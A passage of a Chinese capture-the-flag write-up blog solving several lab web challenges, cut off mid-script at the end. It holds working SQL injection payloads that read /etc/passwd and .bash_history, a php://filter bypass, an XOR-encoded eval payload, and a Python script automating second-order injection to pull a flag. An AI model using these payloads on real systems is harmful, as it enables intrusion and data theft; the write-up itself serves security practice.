alt="wdb2018comment10"></p><blockquote><p> 说明flag不在数据库而在本地文件里，需要读取。在数据库中无需root权限。</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;,content=(select load_file(&#x27;</span><span class="hljs-operator">/</span>etc<span class="hljs-operator">/</span>passwd<span class="hljs-string">&#x27;)),/*</span><br></code></pre></td></tr></table></figure><p><img src="/img/wdb2018comment11.png" alt="wdb2018comment11"></p><p>注意最后一行，<code>www</code> 用户的 <code>home</code> 目录(第五个冒号后)一般都是<code> /var/www</code>, 而这里是<code> /home/www</code></p><p>我们可以想办法读取<code>www</code>用户的操作记录：</p><blockquote><p> .bash_history保存了当前用户使用过的历史命令</p></blockquote><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">&#x27;,content=((<span class="hljs-keyword">select</span>(load_file(<span class="hljs-string">&quot;/home/www/.bash_history&quot;</span>)))),/*<br></code></pre></td></tr></table></figure><p><img src="/img/wdb2018comment13.png" alt="wdb2018comment13"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/tmp/</span>：切换当前工作目录到<span class="hljs-regexp">/tmp/</span>目录<br>unzip html.zip：解压缩名为html.zip的文件<br>rm -f html.zip：强制删除名为html.zip的文件<br>cp -r html <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/：将名为html的目录递归地复制到/</span>var<span class="hljs-regexp">/www/</span>目录下<br>cd <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>：切换当前工作目录到<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>目录<br>rm -f .DS_Store：删除名为.DS_Store的文件<br>service apache2 start：启动Apache2服务<br></code></pre></td></tr></table></figure><p>删除了<code>/var/www/html/.DS_Store</code>，但没删<code>/tmp/html/.DS_Store</code>。</p><blockquote><p>.DS_Store是Mac OS保存文件夹的自定义属性的隐藏文件，如文件的图标位置或背景色，相当于Windows的desktop.ini。经常会有一些不可见的字符</p></blockquote><p>尝试读取：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;,content=(select load_file(&#x27;</span><span class="hljs-operator">/</span>tmp<span class="hljs-operator">/</span>html<span class="hljs-operator">/</span>.DS_Store<span class="hljs-string">&#x27;)),/*</span><br></code></pre></td></tr></table></figure><p><img src="/img/wdb2018comment14.png" alt="wdb2018comment14"></p><p>？？？看下源码：</p><p><img src="/img/wdb2018comment15.png" alt="wdb2018comment15"></p><p>一大堆乱码，可以尝试转换成十六进制读取，为啥么这么转在网上查了一下：</p><p><img src="/img/wdb2018comment17.png" alt="wdb2018comment17"></p><p><code>1&#39;,content=(select hex(load_file(&#39;/tmp/html/.DS_Store&#39;))),/*</code></p><p><img src="/img/wdb2018comment18.png" alt="wdb2018comment18"></p><p>全选之后解码，能发现有这么个东西：</p><p><img src="/img/wdb2018comment20.png" alt="wdb2018comment20"></p><p><code>1&#39;,content=(select hex(load_file(&#39;/var/www/html/flag_8946e1ff1ee3e40f.php&#39;))),/*</code></p><p><img src="/img/wdb2018comment21.png" alt="wdb2018comment21"></p><p>然后十六进制解码就行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;flag&#123;99773ebf-cc83-4cda-a092-a9e1a14af733&#125;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>  <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;<br>  <span class="hljs-variable">$banword</span> = [<br>    <span class="hljs-comment">// no path traversal</span><br>    <span class="hljs-string">&#x27;\.\.&#x27;</span>,<br>    <span class="hljs-comment">// no stream wrapper</span><br>    <span class="hljs-string">&#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;</span>,<br>    <span class="hljs-comment">// no data exfiltration</span><br>    <span class="hljs-string">&#x27;flag&#x27;</span><br>  ];<br>  <span class="hljs-variable">$regexp</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$banword</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<span class="hljs-comment">//不允许目录穿越，ban了一些伪协议和flag关键字</span><br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$regexp</span>, <span class="hljs-variable">$str</span>)) &#123;<span class="hljs-comment">//没有.*，换行绕过也行不通</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-variable">$body</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-variable">$json</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$body</span>, <span class="hljs-literal">true</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$body</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$json</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$json</span>[<span class="hljs-string">&#x27;page&#x27;</span>])) &#123;<br>  <span class="hljs-variable">$page</span> = <span class="hljs-variable">$json</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>  <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$page</span>);<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$content</span> || !<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$content</span>)) &#123;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;</span>;<br>  &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment">// no data exfiltration!!!</span><br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/HarekazeCTF\&#123;.+\&#125;/i&#x27;</span>, <span class="hljs-string">&#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;</span>, <span class="hljs-variable">$content</span>);<span class="hljs-comment">///HarekazeCTF\&#123;.+\&#125;/i 匹配以 HarekazeCTF&#123; 开头，以 &#125; 结尾的文本</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;content&#x27;</span> =&gt; <span class="hljs-variable">$content</span>]); <br></code></pre></td></tr></table></figure><p>挺好懂的一段代码，先是通过正则匹配过滤了目录穿越、一些伪协议和flag关键字。然后利用<code>file_get_contents</code>获得<code>php://input</code>中请求体的内容。然后注意这里<code>POST</code>的内容要符合<code>JSON</code>格式然后把他转换成数组。然后把数组<code>page</code>键对应的值通过<code>file_get_contents</code>函数读出来。这里注意最后的正则匹配把<code>flag</code>的格式完美匹配掉了。</p><p>没过滤<code>filter</code>所以很自然想到利用伪协议去读<code>flag</code>:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p>但过滤了<code>php</code>和<code>flag</code>，不过<code>json decode</code>时会自动把 <code>\u</code> 开头的 Unicode 或者 <code>\x</code> 开头的 hex 转换为正常的字符串。</p><p><code>*ph\u0070://filter/read=convert.base64-encode/resource=\x66lag*</code></p><p>转换成<code>JSON</code>形式，注意键名得是<code>page</code>:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JSON"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;page&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ph\u0070://filter/read=convert.base64-encode/resource=/\u0066lag&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/img/encodeencode1.png" alt="encodeencode1"></p><p>尝试<code>\x</code>开头的失败了。。不知道啥原因，网上的<code>wp</code>都用的<code>unicode</code>并没有用hex。</p><h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_the_flag</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-comment">// webadmin will remove your upload file every 20 min!!!! </span><br>    <span class="hljs-variable">$userdir</span> = <span class="hljs-string">&quot;upload/tmp_&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$userdir</span>))&#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$userdir</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>]))&#123;<br>        <span class="hljs-variable">$tmp_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];<br>        <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>        <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$name</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ph/i&quot;</span>,<span class="hljs-variable">$extension</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>); <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$tmp_name</span>), <span class="hljs-string">&#x27;&lt;?&#x27;</span>)!==False) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">exif_imagetype</span>(<span class="hljs-variable">$tmp_name</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>); <span class="hljs-comment">//检查文件是否为有效的图像文件</span><br>        <span class="hljs-variable">$path</span>= <span class="hljs-variable">$userdir</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$name</span>;<br>        @<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmp_name</span>, <span class="hljs-variable">$path</span>);<br>        <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$path</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$hhh</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;_&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$hhh</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hhh</span>)&gt;<span class="hljs-number">18</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;One inch long, one inch strong!&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="hljs-variable">$hhh</span>) )<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Try something else!&#x27;</span>);<br><br><span class="hljs-variable">$character_type</span> = <span class="hljs-title function_ invoke__">count_chars</span>(<span class="hljs-variable">$hhh</span>, <span class="hljs-number">3</span>);  <span class="hljs-comment">//使用的字节值数目不能超过12个</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$character_type</span>)&gt;<span class="hljs-number">12</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Almost there!&quot;</span>);<br><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$hhh</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>strrpos()</code> 函数查找字符串中最后一次出现的位置，然后使用 <code>substr()</code> 函数从该位置的下一个位置开始截取。</p><p>正则匹配了<code>ph</code>(还是&#x2F;i模式)，这样一来php,phtml啥的后缀根本不要想了。<code>mb_strpos()</code> 函数在文件内容中搜索 <code>&lt;?</code> 字符串。如果找到了该字符串，则 <code>mb_strpos()</code> 函数返回字符串的位置，否则返回 <code>false</code>。</p><p>参考<code>https://liotree.github.io/2019/08/21/EasyWeb/</code></p><p><code>?_=$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;%80&#125;();&%80=phpinfo`这东西其实就相当于：`?_=$&#123;_GET&#125;&#123;函数名&#125;();&函数名=phpinfo`![suctf2019ezweb1](img/suctf2019ezweb1.png)## [网鼎杯2018]Unfinish![wdbunfinish1](img/wdbunfinish1.png)`register.php`![wdbunfinish2](img/wdbunfinish2.png)sb火狐一直弹网站不安全害我注册登录不了。。![wdbunfinish3](img/wdbunfinish3.png)？抓包看下传输过程：![wdbunfinish4](img/wdbunfinish4.png)可以看到用户名密码直接明文传过去了，注册界面也一样：![wdbunfinish5](img/wdbunfinish5.png)![wdbunfinish6](img/wdbunfinish6.png)源码中会显示注册的用户名。这里想着没有注入点的话这个用户名能不能利用，去注册`a'#`发现注册不了？应该是触发了什么过滤。正常注册完应该是直接跳到`login`界面的。后面注册了一下`aa'`还是注册不了，又试了一下`aa''`发现能注册：![wdbunfinish7](img/wdbunfinish7.png)注意这里，我申请的是`aa''`但变成`aa'`了，有个单引号不知道跑哪里去了？单引号能注册大概率是存在转义函数，`''`进去变成了`\'\'`，这里回显的用户名应该是把转义后的拿出来了，后面测试了一下，单数的双引号无法注册，双数的单引号可以成功注册，但会吞掉一半的单引号。先想想吞单引号是怎么回事：`aa''` - > `aa\'\' ` ->  `aa'`首先用户名进去肯定被单引号包裹`'username'`，`aa''`进去之后转义成`aa\'\'`，存到数据库里还是怎么样。回显的时候把`aa\'\'`这东西给拿出来。那怎么做才会吞掉一个单引号呢？`aa''''` -> `aa''`后面去找了源码看看：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$email</span> = <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>]);<br><span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into users(email,username,password) values(&#x27;&quot;</span>.<span class="hljs-variable">$email</span>.<span class="hljs-string">&quot;&#x27;,&#x27;&quot;</span>.<span class="hljs-variable">$username</span>.<span class="hljs-string">&quot;&#x27;,&#x27;&quot;</span>.<span class="hljs-variable">$password</span>.<span class="hljs-string">&quot;&#x27;)&quot;</span>;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select username from users where email=&#x27;&quot;</span>.<span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;email&#x27;</span>]).<span class="hljs-string">&quot;&#x27;&quot;</span>;<br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br></code></pre></td></tr></table></figure>感觉这东西像二次注入+`insert`注入拼起来，但还是不知道怎么回事。。找机会问问别人╮(╯-╰)╭`1'and'0`:![wdbunfinish8](img/wdbunfinish8.png)单引号闭合，而且`1'and'0`这东西变成了`0`。<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql">#<span class="hljs-keyword">sql</span>的字符串运算：数值相加<br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-operator">+</span> <span class="hljs-string">&#x27;2&#x27;</span> <br># <span class="hljs-number">3</span><br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-operator">+</span>database()<span class="hljs-operator">+</span><span class="hljs-string">&#x27;0&#x27;</span>;<br>#<span class="hljs-number">1</span><br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;0&#x27;</span><span class="hljs-operator">+</span>hex(database())<span class="hljs-operator">+</span><span class="hljs-string">&#x27;0&#x27;</span>;<br>#<span class="hljs-number">776562</span> <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> web的<span class="hljs-number">16</span>进制<br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;0&#x27;</span><span class="hljs-operator">+</span>ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">+</span><span class="hljs-string">&#x27;0&#x27;</span>;<br>#<span class="hljs-number">119</span> <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> w的ascii码<br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;0&#x27;</span><span class="hljs-operator">+</span>ascii(substr(database() <span class="hljs-keyword">from</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>))<span class="hljs-operator">+</span><span class="hljs-string">&#x27;0&#x27;</span>;<br>##<span class="hljs-number">119</span> <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> w的ascii码<br>#参考：https:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>blog.csdn.net<span class="hljs-operator">/</span>zzzgd_666<span class="hljs-operator">/</span>article<span class="hljs-operator">/</span>details<span class="hljs-operator">/</span><span class="hljs-number">121704012</span><br>#  https:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>xz.aliyun.com<span class="hljs-operator">/</span>t<span class="hljs-operator">/</span><span class="hljs-number">10594</span><br></code></pre></td></tr></table></figure>![wdbunfinish13](img/wdbunfinish13.png)`0'+hex(database())+'0`![wdbunfinish9](img/wdbunfinish9.png)注意这里是十六进制，转换成字符串就是`web`爆表的话`information`这东西被正则匹配掉了，回显`nonono`。当时想着还能用`sys`库去代替`information_schema`：![wdbunfinish10](img/wdbunfinish10.png)先尝试`0'+hex(hex(version()))+'0`![wdbbbbbbbbbbunfinifh11](img/wdbbbbbbbbbbunfinifh11.png)出了这么个东西，使用两次`hex`主要就是为了消除`abcd`这种字母，而且因为长字符串转成数字型数据的时候会变成科学计数法导致也就是说会丢失数据精度，所以可以一位一位的截。`https://xz.aliyun.com/t/2619#toc-3`注意这个数据库的版本：(底下代码`select * from flag`换成`version()`就行)![wdbunfinish12](img/wdbunfinish12.png)师傅们的`wp`里都是直接`select * from flag`，`flag`这个表是猜出来的。。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">//参考https://www.cnblogs.com/upfine/p/<span class="hljs-number">16607426.</span>html<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag</span>():<br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br>    url = <span class="hljs-string">&#x27;http://7d3b4912-e6bb-4111-b640-7ab9e2fea080.node4.buuoj.cn:81/&#x27;</span><br>    register_url = url + <span class="hljs-string">&#x27;register.php&#x27;</span><br>    login_url = url + <span class="hljs-string">&#x27;login.php&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>        time.sleep(<span class="hljs-number">0.5</span>)<br>        register_data = &#123;<span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;&#123;&#125;@1.com&quot;</span>.<span class="hljs-built_in">format</span>(i),<br>                 <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;0&#x27;+ascii(substr((select * from flag) from &#123;&#125; for 1))+&#x27;0&quot;</span>.<span class="hljs-built_in">format</span>(i), <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br>        login_data = &#123;<span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;&#123;&#125;@1.com&quot;</span>.<span class="hljs-built_in">format</span>(i), <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br>        requests.post(register_url, data=register_data)<br>        response_login = requests.post(login_url, data=login_data)<br>        bs = BeautifulSoup(response_login.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>) <span class="hljs-comment"># 这行代码创建了一个BeautifulSoup对象，用于解析网页的HTML内容。response_login.text是一个包含网页HTML内容的字符串，&#x27;html.parser&#x27;是指定使用HTML解析器来解析网页</span><br>        username = bs.find(<span class="hljs-string">&#x27;span&#x27;</span>, class_=<span class="hljs-string">&#x27;user-name&#x27;</span>)  <span class="hljs-comment"># 取返回页面数据的span class=user-name属性</span><br>        number = username.text  <br>        flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(number))<br>        <span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    get_flag()<br></code></pre></td></tr></table></figure>当然还有利用两次`hex`去转换的，原理和上面差不多:`0'%2B(select substr(hex(hex((select * from flag))) from 1 for 1))%2B'0`参考`https://syunaht.com/p/3379740036.html``https://xz.aliyun.com/t/2619#toc-3`## [CISCN2019 华东南赛区]Double Secret![doublescret1](img/doublescret1.png)`dirsearch`没扫出来啥，试了试`/secret`:![doublesecret2](img/doublesecret2.png)`/secret?secret=1`![doublesecret3](img/doublesecret3.png)`/secret?secret=secret`，开了`Debug`，发现有这么段东西：![ciscndoublesrecreet1](img/ciscndoublesrecreet1.png)<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span>(secret==<span class="hljs-literal">None</span>):<br>       <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span><br>   rc=rc4_Modified.RC4(<span class="hljs-string">&quot;HereIsTreasure&quot;</span>)   <span class="hljs-comment">#解密，这个算法应该是RC4,然后密钥是HereIsTreasure</span><br>   deS=rc.do_crypt(secret) <span class="hljs-comment"># 加密secret</span><br><br>   a=render_template_string(safe(deS)) <span class="hljs-comment"># deS经过safe过滤然后渲染</span><br><br>   <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;ciscn&#x27;</span> <span class="hljs-keyword">in</span> a.lower():<br>       <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;flag detected!&#x27;</span><br>   <span class="hljs-keyword">return</span> a<br></code></pre></td></tr></table></figure>奇怪的是`rc=rc4_Modified.RC4("HereIsTreasure")`的注释是解密？`RC4`找了个网站：`http://tool.chacuo.net/cryptrc4`，这个结果是一致的(有些虽然也是`RC4`但结果不一样)：数据加密后是`base64`编码，然后把它解码就行了。后面看wp发现有大佬直接自己写脚本。。太强了orz：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_main</span>(<span class="hljs-params">key = 